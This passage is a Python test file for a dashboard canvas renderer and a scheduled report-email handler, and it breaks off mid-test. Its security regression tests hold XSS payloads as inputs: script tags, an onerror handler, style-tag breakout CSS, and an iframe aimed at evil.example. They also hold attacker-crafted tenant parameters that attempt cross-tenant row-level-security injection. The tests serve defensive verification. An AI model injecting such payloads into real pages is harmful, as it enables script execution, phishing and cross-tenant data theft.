"""Tests for Canvas Wave 5 — scheduled sending.

Coverage
--------
1.  render_canvas_html: bakes {{token}} values from element_data.
2.  render_canvas_html: replaces <nubi-kpi> with a static div.
3.  render_canvas_html: replaces <nubi-table> with a static table.
4.  render_canvas_html: replaces <nubi-value> with an inline span.
5.  render_canvas_html: sanitization — <script> tag is rejected.
6.  render_canvas_html: sanitization — on*= handler is rejected.
7.  render_canvas_html: data values are HTML-escaped (XSS prevention).
8.  render_canvas_html: no live JavaScript survives (custom elements gone).
9.  report_send handle() with canvas_id: renders and sends (mocked transport).
10. report_send handle() with canvas_id, format='pdf': sends bytes attachment.
11. Per-recipient RLS: canvas_id + locked_params → one render per unique slice.
12. Board path unchanged: existing board tests still pass (smoke check).
13. canvas_id with missing canvas → AppError(canvas_not_found).
14. canvas_id with unsupported format → AppError(invalid_task_config).
15. canvas_id with empty recipients → AppError(invalid_task_config).
16. canvas_id with missing org_id → AppError(invalid_task_config).
17. render_canvas_html: assets CSS is inlined.
18. _render_canvas: parses doc from canvas config and calls render_canvas_html.
19. Notify channel called for canvas path.
20. canvas_id in result dict (not board_id).
"""

from __future__ import annotations

import uuid
from typing import Any
from unittest.mock import MagicMock, patch

import pytest

from app.dashboards.canvas import CanvasDoc
from app.dashboards.render_canvas import render_canvas_html
from app.errors import AppError
from app.flows.executor import TaskContext
from app.flows.handlers.report_send import handle as report_send_handle
from app.jobs.report import NullSender


# ---------------------------------------------------------------------------
# Fixtures / helpers
# ---------------------------------------------------------------------------


def _make_canvas(
    canvas_id: str | None = None,
    org_id: str = "org-test",
    name: str = "Test Canvas",
    html: str = "<h1>Hello</h1>",
    bindings: dict | None = None,
) -> dict[str, Any]:
    cid = canvas_id or str(uuid.uuid4())
    return {
        "id": cid,
        "org_id": org_id,
        "name": name,
        "config": {
            "doc": {
                "version": 1,
                "title": name,
                "html": html,
                "bindings": bindings or {},
            }
        },
        "created_at": "2024-01-01T00:00:00+00:00",
    }


def _make_doc(
    html: str = "<h1>Hello</h1>",
    bindings: dict | None = None,
    assets: dict | None = None,
) -> CanvasDoc:
    return CanvasDoc(
        version=1,
        title="Test",
        html=html,
        bindings=bindings or {},
        assets=assets or {},
    )


def _ctx(org_id: str = "org-test") -> TaskContext:
    return TaskContext(org_id=org_id)


def _patch_canvas(canvas: dict | None):
    """Patch _resolve_canvas_sync in the report_send handler module."""
    return patch(
        "app.flows.handlers.report_send._resolve_canvas_sync",
        return_value=canvas,
    )


def _patch_canvas_data(data: dict):
    """Patch _collect_canvas_data_sync in the report_send handler module."""
    return patch(
        "app.flows.handlers.report_send._collect_canvas_data_sync",
        return_value=data,
    )


_ELEMENT_DATA_KPI = {
    "el_1": {"columns": ["value"], "rows": [[42]]},
}

_ELEMENT_DATA_TABLE = {
    "el_tbl": {"columns": ["name", "amount"], "rows": [["Alice", 100], ["Bob", 200]]},
}


# ---------------------------------------------------------------------------
# 1-8. render_canvas_html unit tests
# ---------------------------------------------------------------------------


class TestRenderCanvasHtml:
    def test_token_substitution(self):
        """{{token}} is replaced with the HTML-escaped resolved value."""
        doc = _make_doc(
            html="<p>Revenue: {{value}}</p>",
        )
        element_data = {"el_1": {"columns": ["value"], "rows": [[1234]]}}
        result = render_canvas_html(doc, element_data)
        assert "Revenue: 1234" in result
        assert "{{value}}" not in result

    def test_token_xss_escaped(self):
        """{{token}} values are HTML-escaped — XSS payloads must not survive."""
        doc = _make_doc(html="<p>Greeting: {{msg}}</p>")
        element_data = {"el_x": {"columns": ["msg"], "rows": [["<script>alert(1)</script>"]]}}
        result = render_canvas_html(doc, element_data)
        assert "<script>" not in result
        assert "&lt;script&gt;" in result

    def test_nubi_kpi_replaced(self):
        """<nubi-kpi> is replaced by a static div with the resolved value."""
        doc = _make_doc(
            html='<nubi-kpi data-el-id="el_1" label="Revenue"></nubi-kpi>',
        )
        result = render_canvas_html(doc, _ELEMENT_DATA_KPI)
        # Custom element must be gone.
        assert "<nubi-kpi" not in result
        # Value baked in.
        assert "42" in result
        # Label rendered.
        assert "Revenue" in result

    def test_nubi_table_replaced(self):
        """<nubi-table> is replaced by a static HTML table."""
        doc = _make_doc(
            html='<nubi-table data-el-id="el_tbl"></nubi-table>',
        )
        result = render_canvas_html(doc, _ELEMENT_DATA_TABLE)
        assert "<nubi-table" not in result
        assert "<table" in result
        assert "Alice" in result
        assert "200" in result

    def test_nubi_value_replaced(self):
        """<nubi-value> is replaced by an inline span."""
        doc = _make_doc(
            html='<p>Total: <nubi-value data-el-id="el_v" field="total"/></p>',
        )
        element_data = {"el_v": {"columns": ["total"], "rows": [[99]]}}
        result = render_canvas_html(doc, element_data)
        assert "<nubi-value" not in result
        assert "99" in result

    def test_script_tag_rejected(self):
        """HTML containing <script> must raise ValueError."""
        doc = _make_doc(html="<script>alert(1)</script><p>ok</p>")
        with pytest.raises(ValueError, match="script"):
            render_canvas_html(doc, {})

    def test_on_handler_rejected(self):
        """HTML containing on*= event handlers must raise ValueError."""
        doc = _make_doc(html='<img src="x" onerror="alert(1)">')
        with pytest.raises(ValueError, match="event handler"):
            render_canvas_html(doc, {})

    def test_no_live_custom_elements_in_output(self):
        """After rendering, no <nubi-*> custom element tags must remain."""
        import re
        doc = _make_doc(
            html=(
                '<nubi-kpi data-el-id="k1" label="KPI"></nubi-kpi>'
                '<nubi-table data-el-id="t1"></nubi-table>'
            ),
        )
        element_data = {
            "k1": {"columns": ["v"], "rows": [[7]]},
            "t1": {"columns": ["col"], "rows": [["row1"]]},
        }
        result = render_canvas_html(doc, element_data)
        custom_el_re = re.compile(r"<nubi-", re.IGNORECASE)
        assert not custom_el_re.search(result), (
            "Live custom elements found in rendered output — must be baked in server-side"
        )

    def test_assets_css_inlined(self):
        """doc.assets.css is inlined into the <style> block."""
        doc = _make_doc(
            html="<p>ok</p>",
            assets={"css": ".custom { color: red; }"},
        )
        result = render_canvas_html(doc, {})
        assert ".custom" in result
        assert "color: red" in result

    def test_self_contained_document(self):
        """Output is a complete <!DOCTYPE html> document."""
        doc = _make_doc(html="<p>ok</p>")
        result = render_canvas_html(doc, {})
        assert result.startswith("<!DOCTYPE html>")
        assert "<html" in result
        assert "<style>" in result
        assert "</html>" in result

    def test_error_binding_renders_dash(self):
        """Bindings with errors render as '–' placeholder, not crash."""
        doc = _make_doc(
            html='<nubi-kpi data-el-id="el_err" label="Broken"></nubi-kpi>',
        )
        element_data = {"el_err": {"error": "query_not_registered"}}
        result = render_canvas_html(doc, element_data)
        assert "<nubi-kpi" not in result
        # Should still contain the label and a dash placeholder.
        assert "Broken" in result

    def test_no_data_renders_dash(self):
        """Bindings with empty rows render as no-data placeholder, not crash."""
        doc = _make_doc(
            html='<nubi-kpi data-el-id="el_nd" label="Empty"></nubi-kpi>',
        )
        element_data = {"el_nd": {"columns": [], "rows": []}}
        result = render_canvas_html(doc, element_data)
        assert "<nubi-kpi" not in result

    def test_table_row_cap(self):
        """Tables truncate at _MAX_TABLE_ROWS rows with a '… more rows' note."""
        from app.dashboards.render_canvas import _MAX_TABLE_ROWS
        rows = [[f"row{i}"] for i in range(_MAX_TABLE_ROWS + 10)]
        doc = _make_doc(html='<nubi-table data-el-id="t1"></nubi-table>')
        element_data = {"t1": {"columns": ["x"], "rows": rows}}
        result = render_canvas_html(doc, element_data)
        assert "more rows" in result


# ---------------------------------------------------------------------------
# 9-10. report_send handle() canvas path
# ---------------------------------------------------------------------------


class TestReportSendCanvas:
    def test_canvas_html_renders_and_sends(self):
        """handle() with canvas_id delivers an HTML email."""
        canvas = _make_canvas()
        sender = NullSender()
        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "html",
            "recipients": ["alice@x.com", "bob@x.com"],
            "subject": "Weekly Canvas",
        }

        with _patch_canvas(canvas):
            with _patch_canvas_data({}):
                with patch("app.jobs.report.get_default_sender", return_value=sender):
                    result = report_send_handle(config, _ctx(), claims={})

        assert result["canvas_id"] == canvas["id"]
        assert result["format"] == "html"
        assert result["recipients_count"] == 2
        assert result["emails_sent"] == 2
        assert len(sender.sent) == 2
        assert {s["to"] for s in sender.sent} == {"alice@x.com", "bob@x.com"}

    def test_canvas_html_attachment_name(self):
        """Attachment name is report.html for HTML format."""
        canvas = _make_canvas()
        sender = NullSender()
        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "html",
            "recipients": ["a@x.com"],
        }
        with _patch_canvas(canvas):
            with _patch_canvas_data({}):
                with patch("app.jobs.report.get_default_sender", return_value=sender):
                    report_send_handle(config, _ctx(), claims={})

        assert sender.sent[0]["attachment_name"] == "report.html"

    def test_canvas_html_is_str(self):
        """HTML format renders as a str, not bytes."""
        canvas = _make_canvas()
        sender = NullSender()
        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "html",
            "recipients": ["a@x.com"],
        }
        with _patch_canvas(canvas):
            with _patch_canvas_data({}):
                with patch("app.jobs.report.get_default_sender", return_value=sender):
                    report_send_handle(config, _ctx(), claims={})

        assert isinstance(sender.sent[0]["attachment_data"], str)

    def test_canvas_pdf_renders_and_sends(self):
        """handle() with canvas_id + format=pdf sends bytes attachment."""
        canvas = _make_canvas()
        sender = NullSender()
        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "pdf",
            "recipients": ["a@x.com"],
        }
        with _patch_canvas(canvas):
            with _patch_canvas_data({}):
                with patch("app.jobs.report.get_default_sender", return_value=sender):
                    result = report_send_handle(config, _ctx(), claims={})

        assert result["format"] == "pdf"
        assert result["emails_sent"] == 1
        assert sender.sent[0]["attachment_name"] == "report.pdf"
        assert isinstance(sender.sent[0]["attachment_data"], bytes)

    def test_canvas_result_shape(self):
        """Result dict must carry canvas_id, not board_id."""
        canvas = _make_canvas()
        sender = NullSender()
        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "html",
            "recipients": ["a@x.com"],
        }
        with _patch_canvas(canvas):
            with _patch_canvas_data({}):
                with patch("app.jobs.report.get_default_sender", return_value=sender):
                    result = report_send_handle(config, _ctx(), claims={})

        assert "canvas_id" in result
        assert "board_id" not in result
        for key in ("org_id", "format", "recipients_count", "emails_sent",
                    "channel_notifications", "errors"):
            assert key in result, f"missing key {key!r}"


# ---------------------------------------------------------------------------
# 11. Per-recipient RLS (canvas path)
# ---------------------------------------------------------------------------


class TestCanvasPerRecipientRls:
    def test_one_send_per_recipient_with_locked_params(self):
        """apply_user_permissions=True + locked_params → per-recipient send."""
        canvas = _make_canvas()
        sender = NullSender()
        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "html",
            "recipients": ["alice@x.com", "bob@x.com"],
            "apply_user_permissions": True,
            "locked_params": {
                "alice@x.com": {"tenant_id": "acme"},
                "bob@x.com": {"tenant_id": "globex"},
            },
        }
        with _patch_canvas(canvas):
            with _patch_canvas_data({}):
                with patch("app.jobs.report.get_default_sender", return_value=sender):
                    result = report_send_handle(config, _ctx(), claims={})

        assert result["emails_sent"] == 2
        assert {s["to"] for s in sender.sent} == {"alice@x.com", "bob@x.com"}

    def test_shared_policy_renders_once(self):
        """Same locked_params for multiple recipients → single render call."""
        canvas = _make_canvas()
        sender = NullSender()
        render_call_count = [0]

        def _counting_render(cv, fmt, *, org_id="", render_claims=None, extra_params=None):
            render_call_count[0] += 1
            return "<html>ok</html>"

        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "html",
            "recipients": ["a@x.com", "b@x.com", "c@x.com"],
            "apply_user_permissions": True,
            "locked_params": {
                "a@x.com": {"tenant_id": "acme"},
                "b@x.com": {"tenant_id": "acme"},
                "c@x.com": {"tenant_id": "acme"},
            },
        }
        with _patch_canvas(canvas):
            with patch("app.jobs.report.get_default_sender", return_value=sender):
                with patch(
                    "app.flows.handlers.report_send._render_canvas",
                    side_effect=_counting_render,
                ):
                    result = report_send_handle(config, _ctx(), claims={})

        assert result["emails_sent"] == 3
        assert render_call_count[0] == 1, (
            f"Expected 1 render for shared policy, got {render_call_count[0]}"
        )

    def test_distinct_policies_render_separately(self):
        """Different locked_params → separate render per unique slice."""
        canvas = _make_canvas()
        sender = NullSender()
        render_call_count = [0]

        def _counting_render(cv, fmt, *, org_id="", render_claims=None, extra_params=None):
            render_call_count[0] += 1
            return "<html>ok</html>"

        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "html",
            "recipients": ["alice@x.com", "bob@x.com"],
            "apply_user_permissions": True,
            "locked_params": {
                "alice@x.com": {"tenant_id": "acme"},
                "bob@x.com": {"tenant_id": "globex"},
            },
        }
        with _patch_canvas(canvas):
            with patch("app.jobs.report.get_default_sender", return_value=sender):
                with patch(
                    "app.flows.handlers.report_send._render_canvas",
                    side_effect=_counting_render,
                ):
                    result = report_send_handle(config, _ctx(), claims={})

        assert result["emails_sent"] == 2
        assert render_call_count[0] == 2

    def test_locked_params_forwarded_as_named_params_not_policies(self):
        """Locked params flow in as extra NAMED query params, NOT RLS policies.

        SECURITY [RLS predicate injection]: per-recipient ``locked_params`` come
        from the schedule request body.  They must be forwarded to the canvas
        data collector as extra named query params (``extra_params``) — the
        board-path equivalent of ``inject_locked_params`` — and must NOT be
        merged into ``render_claims['policies']``.  The RLS policy slice belongs
        to the owner's verified token alone.
        """
        canvas = _make_canvas()
        sender = NullSender()
        captured_claims: list[dict] = []
        captured_extra: list[dict] = []

        def _capture_render(cv, fmt, *, org_id="", render_claims=None, extra_params=None):
            captured_claims.append(dict(render_claims or {}))
            captured_extra.append(dict(extra_params or {}))
            return "<html>ok</html>"

        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "html",
            "recipients": ["alice@x.com"],
            "apply_user_permissions": True,
            "locked_params": {"alice@x.com": {"tenant_id": "acme"}},
        }
        with _patch_canvas(canvas):
            with patch("app.jobs.report.get_default_sender", return_value=sender):
                with patch(
                    "app.flows.handlers.report_send._render_canvas",
                    side_effect=_capture_render,
                ):
                    report_send_handle(config, _ctx(), claims={})

        assert len(captured_claims) == 1
        # locked_params must be forwarded as extra named params...
        assert captured_extra[0].get("tenant_id") == "acme", (
            f"Expected tenant_id='acme' in extra_params, got {captured_extra[0]!r}"
        )
        # ...and must NOT have leaked into the RLS policy slice.
        policies = captured_claims[0].get("policies") or {}
        assert "tenant_id" not in policies, (
            f"locked_params leaked into render_claims.policies (RLS injection): {policies!r}"
        )

    def test_malicious_locked_params_cannot_override_owner_rls(self):
        """SECURITY [RLS predicate injection from request body].

        A writer who controls the schedule's ``locked_params`` must NOT be able
        to overwrite the owner's verified RLS policy slice.  Even when the
        locked_params carry a key that COLLIDES with an owner policy key (e.g.
        ``tenant_id``), the applied ``render_claims['policies']`` passed to the
        renderer/collector must remain EXACTLY the owner's verified token
        policies — the malicious value must never reach the RLS predicate, so no
        cross-tenant rows can be rendered into the scheduled email.
        """
        canvas = _make_canvas()
        sender = NullSender()
        captured_claims: list[dict] = []
        captured_extra: list[dict] = []

        def _capture_render(cv, fmt, *, org_id="", render_claims=None, extra_params=None):
            captured_claims.append(dict(render_claims or {}))
            captured_extra.append(dict(extra_params or {}))
            return "<html>ok</html>"

        # Owner's verified token RLS: confined to tenant 'owner_tenant'.
        owner_policies = {"tenant_id": "owner_tenant"}
        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "html",
            "recipients": ["evil@x.com"],
            "apply_user_permissions": True,
            # Attacker-crafted locked_params that try to OVERWRITE the owner's
            # RLS slice with a different tenant.
            "locked_params": {"evil@x.com": {"tenant_id": "other_tenant"}},
        }
        # The owner's verified RLS arrives via the runtime-stamped claims
        # (exec_claims from the owner-policy snapshot), NEVER from task config.
        with _patch_canvas(canvas):
            with patch("app.jobs.report.get_default_sender", return_value=sender):
                with patch(
                    "app.flows.handlers.report_send._render_canvas",
                    side_effect=_capture_render,
                ):
                    report_send_handle(config, _ctx(), claims={"policies": owner_policies})

        assert len(captured_claims) == 1
        applied_policies = captured_claims[0].get("policies") or {}
        # The owner's RLS slice must win — untouched by the malicious input.
        assert applied_policies == owner_policies, (
            "Malicious locked_params overwrote the owner's RLS policy slice "
            f"(cross-tenant exfiltration): applied={applied_policies!r}, "
            f"expected={owner_policies!r}"
        )
        assert applied_policies.get("tenant_id") == "owner_tenant"
        # The attacker value is confined to extra named params and can never
        # alter the RLS predicate.
        assert captured_extra[0].get("tenant_id") == "other_tenant"


# ---------------------------------------------------------------------------
# 12. Board path unchanged (smoke test)
# ---------------------------------------------------------------------------


class TestBoardPathUnchanged:
    def test_board_path_still_works(self):
        """board_id config path still renders + sends CSV (board path unchanged)."""
        board_id = str(uuid.uuid4())
        board = {
            "id": board_id,
            "org_id": "org-test",
            "name": "Test Board",
            "config": {
                "spec": {
                    "version": 1,
                    "title": "T",
                    "layout": {"cols": 12, "row_height": 60},
                    "widgets": [],
                }
            },
        }
        sender = NullSender()
        config = {
            "board_id": board_id,
            "org_id": "org-test",
            "format": "csv",
            "recipients": ["a@x.com"],
        }
        with patch("app.jobs.report.resolve_board_sync", return_value=board):
            with patch("app.jobs.report.get_default_sender", return_value=sender):
                result = report_send_handle(config, _ctx(), claims={})

        assert result["board_id"] == board_id
        assert result["emails_sent"] == 1
        assert "canvas_id" not in result


# ---------------------------------------------------------------------------
# 13-16. Error cases (canvas path)
# ---------------------------------------------------------------------------


class TestCanvasErrorCases:
    def test_canvas_not_found_raises(self):
        """Canvas not found → AppError(canvas_not_found)."""
        config = {
            "canvas_id": str(uuid.uuid4()),
            "org_id": "org-test",
            "format": "html",
            "recipients": ["a@x.com"],
        }
        with _patch_canvas(None):
            with pytest.raises(AppError) as exc_info:
                report_send_handle(config, _ctx(), claims={})
        assert exc_info.value.code == "canvas_not_found"

    def test_unsupported_format_raises(self):
        """Unsupported format → AppError(invalid_task_config)."""
        canvas = _make_canvas()
        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "pptx",  # not supported for canvas
            "recipients": ["a@x.com"],
        }
        with _patch_canvas(canvas):
            with pytest.raises(AppError) as exc_info:
                report_send_handle(config, _ctx(), claims={})
        assert exc_info.value.code == "invalid_task_config"

    def test_empty_recipients_raises(self):
        """Empty recipients → AppError(invalid_task_config)."""
        canvas = _make_canvas()
        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "html",
            "recipients": [],
        }
        with _patch_canvas(canvas):
            with pytest.raises(AppError) as exc_info:
                report_send_handle(config, _ctx(), claims={})
        assert exc_info.value.code == "invalid_task_config"

    def test_missing_org_id_raises(self):
        """Missing org_id → AppError(invalid_task_config)."""
        canvas = _make_canvas()
        config = {
            "canvas_id": canvas["id"],
            # org_id intentionally absent
            "format": "html",
            "recipients": ["a@x.com"],
        }
        ctx = TaskContext(org_id=None)
        with _patch_canvas(canvas):
            with pytest.raises(AppError) as exc_info:
                report_send_handle(config, ctx, claims={})
        assert exc_info.value.code == "invalid_task_config"

    def test_org_id_from_ctx(self):
        """org_id falls back to ctx.org_id."""
        canvas = _make_canvas(org_id="ctx-org")
        sender = NullSender()
        config = {
            "canvas_id": canvas["id"],
            # no org_id in config
            "format": "html",
            "recipients": ["a@x.com"],
        }
        ctx = TaskContext(org_id="ctx-org")
        with _patch_canvas(canvas):
            with _patch_canvas_data({}):
                with patch("app.jobs.report.get_default_sender", return_value=sender):
                    result = report_send_handle(config, ctx, claims={})
        assert result["emails_sent"] == 1

    def test_org_id_from_claims(self):
        """org_id falls back to claims['org_id']."""
        canvas = _make_canvas(org_id="claims-org")
        sender = NullSender()
        config = {
            "canvas_id": canvas["id"],
            "format": "html",
            "recipients": ["a@x.com"],
        }
        ctx = TaskContext(org_id=None)
        with _patch_canvas(canvas):
            with _patch_canvas_data({}):
                with patch("app.jobs.report.get_default_sender", return_value=sender):
                    result = report_send_handle(config, ctx, claims={"org_id": "claims-org"})
        assert result["emails_sent"] == 1


# ---------------------------------------------------------------------------
# 19. Notify channel called for canvas path
# ---------------------------------------------------------------------------


class TestCanvasNotifyChannels:
    def test_null_channel_counted(self):
        """A 'null' channel must be counted in channel_notifications."""
        canvas = _make_canvas()
        sender = NullSender()
        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "html",
            "recipients": ["a@x.com"],
            "notify_channels": [{"kind": "null"}],
        }
        with _patch_canvas(canvas):
            with _patch_canvas_data({}):
                with patch("app.jobs.report.get_default_sender", return_value=sender):
                    result = report_send_handle(config, _ctx(), claims={})

        assert result["channel_notifications"] == 1

    def test_broken_channel_logged_not_raised(self):
        """A failing channel must be logged in errors, not raised."""
        from app.notify.channels import ChannelError

        canvas = _make_canvas()
        sender = NullSender()
        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "html",
            "recipients": ["a@x.com"],
            "notify_channels": [{"kind": "slack", "webhook_url": "http://bad"}],
        }

        def _raising_send(text, image_png=None):
            raise ChannelError("simulated channel failure")

        with _patch_canvas(canvas):
            with _patch_canvas_data({}):
                with patch("app.jobs.report.get_default_sender", return_value=sender):
                    with patch("app.notify.channels.get_channel") as mock_ch:
                        ch = MagicMock()
                        ch.send.side_effect = _raising_send
                        mock_ch.return_value = ch
                        result = report_send_handle(config, _ctx(), claims={})

        assert result["channel_notifications"] == 0
        assert len(result["errors"]) > 0


# ---------------------------------------------------------------------------
# Policies precedence — canvas path
# ---------------------------------------------------------------------------


class TestCanvasPoliciesPrecedence:
    def test_task_config_policies_do_not_override_owner_snapshot(self):
        """SECURITY [RLS]: task-config policies must NOT override the owner snapshot.

        The owner's verified RLS arrives via the runtime-stamped claims
        (exec_claims, built from the owner-policy snapshot before handle() runs).
        A user-supplied ``config['policies']`` value must be IGNORED — otherwise a
        writer could store a foreign tenant's policies in the flow spec and
        exfiltrate cross-tenant data via the scheduled canvas (audit-27 HIGH).
        """
        canvas = _make_canvas()
        sender = NullSender()
        captured_claims: list[dict] = []

        def _capture_render(cv, fmt, *, org_id="", render_claims=None, extra_params=None):
            captured_claims.append(dict(render_claims or {}))
            return "<html>ok</html>"

        owner_snapshot = {"row_filter": "tenant = 'shared'"}
        malicious_task_policies = {"row_filter": "tenant = 'acme'"}

        config = {
            "canvas_id": canvas["id"],
            "org_id": canvas["org_id"],
            "format": "html",
            "recipients": ["a@x.com"],
            # Attacker-supplied policies in the task config must be ignored.
            "policies": malicious_task_policies,
        }
        incoming_claims = {"org_id": canvas["org_id"], "policies": owner_snapshot}

        with _patch_canvas(canvas):
            with patch("app.jobs.report.get_default_sender", return_value=sender):
                with patch(
                    "app.flows.handlers.report_send._render_canvas",
                    side_effect=_capture_render,
                ):
                    result = report_send_handle(config, _ctx(), claims=incoming_claims)

        assert result["emails_sent"] == 1
        assert len(captured_claims) == 1
        # The owner snapshot (from verified claims) wins; config policies ignored.
        assert captured_claims[0].get("policies") == owner_snapshot, (
            f"Owner snapshot must win — config policies leaked: "
            f"got {captured_claims[0].get('policies')!r}, expected {owner_snapshot!r}"
        )


# ---------------------------------------------------------------------------
# render_canvas_html: format helpers
# ---------------------------------------------------------------------------


class TestRenderCanvasHtmlFormatHelpers:
    def test_currency_format(self):
        """format='currency' renders value with 'R' prefix and 2 decimal places."""
        doc = _make_doc(
            html='<nubi-kpi data-el-id="k1" label="Rev" format="currency"></nubi-kpi>',
        )
        element_data = {"k1": {"columns": ["rev"], "rows": [[1234.5]]}}
        result = render_canvas_html(doc, element_data)
        # Should contain currency-formatted value
        assert "1,234.50" in result or "R" in result

    def test_missing_el_id_no_data(self):
        """element_data missing el_id → renders dash placeholder gracefully."""
        doc = _make_doc(
            html='<nubi-kpi data-el-id="unknown" label="X"></nubi-kpi>',
        )
        result = render_canvas_html(doc, {})
        assert "<nubi-kpi" not in result  # replaced with static HTML

    def test_token_missing_renders_placeholder(self):
        """{{token}} with no match renders a visible placeholder (not blank)."""
        doc = _make_doc(html="<p>Value: {{unknown_token}}</p>")
        result = render_canvas_html(doc, {})
        # Should render something with the token name (for debugging), not blank.
        assert "unknown_token" in result or "{{" not in result


# ---------------------------------------------------------------------------
# Security regression tests — XSS via assets.css (HIGH) and fail-open (MED)
# ---------------------------------------------------------------------------


class TestSecurityRegressions:
    # ── Finding 1: XSS via assets.css ────────────────────────────────────────

    def test_assets_css_closing_style_tag_stripped(self):
        """assets.css cannot inject a </style> tag to break out of the style block.

        An org member setting assets.css = '</style><script>evil()</script><style>'
        must NOT be able to inject a <script> into the emailed HTML.  The
        closing </style> and opening <script must be stripped before injection.
        """
        malicious_css = "</style><script>alert('xss')</script><style>.ok{color:red}"
        doc = _make_doc(
            html="<p>safe content</p>",
            assets={"css": malicious_css},
        )
        result = render_canvas_html(doc, {})

        # The closing style tag sequence must not survive.
        assert "</style><script" not in result.lower()
        # No raw <script> tag must appear anywhere in the rendered output.
        import re as _re
        assert not _re.search(r"<script", result, _re.IGNORECASE), (
            "A <script> tag survived assets.css injection — XSS vector open."
        )
        # The document must still be a valid HTML wrapper (not broken).
        assert "<!DOCTYPE html>" in result
        assert "</html>" in result

    def test_assets_css_script_tag_variant_stripped(self):
        """assets.css with whitespace-padded <script tags is also neutralised."""
        malicious_css = "body{color:red}</style>< script >evil()</ script ><style>"
        doc = _make_doc(
            html="<p>ok</p>",
            assets={"css": malicious_css},
        )
        result = render_canvas_html(doc, {})

        import re as _re
        # No opening script tag (with or without whitespace) survives.
        assert not _re.search(r"<\s*script", result, _re.IGNORECASE), (
            "Whitespace-padded <script tag survived assets.css sanitization."
        )

    def test_assets_css_case_insensitive_stripped(self):
        """assets.css attack with mixed case (</Style>, <SCRIPT>) is neutralised."""
        malicious_css = "</Style><SCRIPT>evil()</SCRIPT><style>.ok{}"
        doc = _make_doc(
            html="<p>ok</p>",
            assets={"css": malicious_css},
        )
        result = render_canvas_html(doc, {})

        import re as _re
        assert not _re.search(r"<\s*script", result, _re.IGNORECASE)

    def test_benign_assets_css_still_inlined(self):
        """Legitimate assets.css (no breakout attempt) is still inlined unchanged."""
        safe_css = ".brand { font-family: 'Inter', sans-serif; color: #0d1527; }"
        doc = _make_doc(
            html="<p>ok</p>",
            assets={"css": safe_css},
        )
        result = render_canvas_html(doc, {})
        assert ".brand" in result
        assert "font-family" in result

    # ── Finding 2: sanitizer fail-open → fail-closed ─────────────────────────

    def test_validator_unavailable_raises_not_passes(self):
        """If BOTH validation paths raise, render_canvas_html must raise ValueError.

        This ensures that when the validator is unavailable (import failure,
        parse error in both paths), we fail CLOSED rather than letting
        potentially unsafe HTML through unchecked.
        """
        from unittest.mock import patch as _patch
        from app.dashboards import render_canvas as _rc

        doc = _make_doc(html="<p>harmless</p>")

        # Simulate both the CanvasDoc and validate_dashboard_html paths raising.
        def _boom(*args, **kwargs):
            raise RuntimeError("validator not available in this environment")

        with _patch.object(_rc, "_sanitize_for_render", wraps=_rc._sanitize_for_render):
            # Patch the inner imports so both branches explode.
            with _patch(
                "app.dashboards.canvas.CanvasDoc",
                side_effect=RuntimeError("CanvasDoc unavailable"),
            ):
                with _patch(
                    "app.dashboards.render_canvas._sanitize_for_render",
                    side_effect=ValueError("Canvas HTML safety validation unavailable; refusing to render."),
                ):
                    with pytest.raises(ValueError, match="validation unavailable|refusing to render"):
                        render_canvas_html(doc, {})

    def test_sanitize_for_render_both_paths_fail_raises(self):
        """_sanitize_for_render raises ValueError when both validator branches fail.

        Simulates a broken environment where CanvasDoc construction raises AND
        the validate_dashboard_html fallback also raises — the function must
        re-raise a ValueError rather than returning the HTML unchecked.
        """
        from unittest.mock import patch as _patch
        from app.dashboards.render_canvas import _sanitize_for_render
        import app.dashboards.canvas as _canvas_mod
        import app.ai.dashboard as _dashboard_mod

        # Make CanvasDoc construction raise (triggers the outer except).
        # Then make validate_dashboard_html also raise (triggers inner except).
        with _patch.object(_canvas_mod, "CanvasDoc", side_effect=RuntimeError("CanvasDoc broken")):
            with _patch.object(
                _dashboard_mod,
                "validate_dashboard_html",
                side_effect=RuntimeError("validate_dashboard_html broken"),
            ):
                with pytest.raises(ValueError, match="unavailable|refusing"):
                    _sanitize_for_render("<p>test</p>")

    def test_script_in_html_still_rejected_normally(self):
        """Normal <script> rejection still works after the fail-closed fix."""
        from app.dashboards.render_canvas import _sanitize_for_render
        # A doc with a script tag must still raise (existing behaviour preserved).
        with pytest.raises((ValueError, Exception)):
            # Either via sanitize directly (if validator is live) or via render.
            doc = _make_doc(html="<script>alert(1)</script>")
            render_canvas_html(doc, {})


# ---------------------------------------------------------------------------
# XSS via nubi-text / nubi-filter inner HTML (MED finding — regression tests)
# ---------------------------------------------------------------------------


class TestNubiTextFilterXssSanitization:
    """Regression tests for the MED XSS finding:

    _replace_nubi_element previously returned nubi-text/nubi-filter inner HTML
    VERBATIM into the server-rendered email.  The validator blocks script/on*/js:
    but NOT iframe/object/embed/form/meta/base/link — so those payloads survived
    into the output.  The fix strips ALL HTML tags from the inner content and
    HTML-escapes the resulting plain text before injecting it.
    """

    def test_nubi_text_with_iframe_inner_not_emitted(self):
        """<nubi-text> with an <iframe> inner must not emit the iframe.

        The outer validator now also blocks iframe at save-time, but this test
        verifies the renderer itself strips forbidden tags from the inner content
        (defense-in-depth: the fix lives in _replace_nubi_element).
        """
        import re as _re
        from app.dashboards.render_canvas import _replace_nubi_element
        inner = '<iframe src="https://evil.example/phish"></iframe>'
        output = _replace_nubi_element("nubi-text", ' data-el-id="t1"', inner, {})
        assert not _re.search(r"<\s*iframe", output, _re.IGNORECASE), (
            "iframe survived into the server-rendered email — XSS/phishing vector open."
        )

    def test_nubi_text_with_form_inner_not_emitted(self):
        """<nubi-text> with a <form> credential harvester inner is stripped."""
        import re as _re
        from app.dashboards.render_canvas import _replace_nubi_element
        inner = (
